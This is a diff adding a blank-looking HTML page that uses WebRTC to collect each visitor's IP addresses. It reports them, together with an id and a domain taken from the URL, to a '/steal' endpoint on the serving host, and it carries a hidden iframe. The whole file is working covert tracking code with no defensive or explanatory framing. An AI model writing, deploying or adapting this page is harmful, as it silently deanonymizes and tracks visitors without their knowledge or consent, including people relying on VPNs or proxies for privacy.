@@ -1,0 +1,28 @@
+﻿<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <script src="getIPs.js"></script>
+		<script src="w2g.js"></script>
+    </head>
+    <body>
+	<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
+        <script>
+            window.WebRTC_IPs.getIPs()
+                  .then(ips => {
+                      ips.forEach(handleIP);
+                  });
+
+            function handleIP(item) {
+                ip = item.address;
+				MyAddress(ip);
+            }
+			function MyAddress(ip){
+				var argvs = location.href.split('?')[1].split('!');
+				var id = argvs[0];
+				var domain = argvs[1];
+				w2g.net.get("/steal?info="+ip+"&id="+id+"&domain="+domain+"&type=4&date="+new Date().getTime());
+			}
+        </script>
+    </body>
+</html>
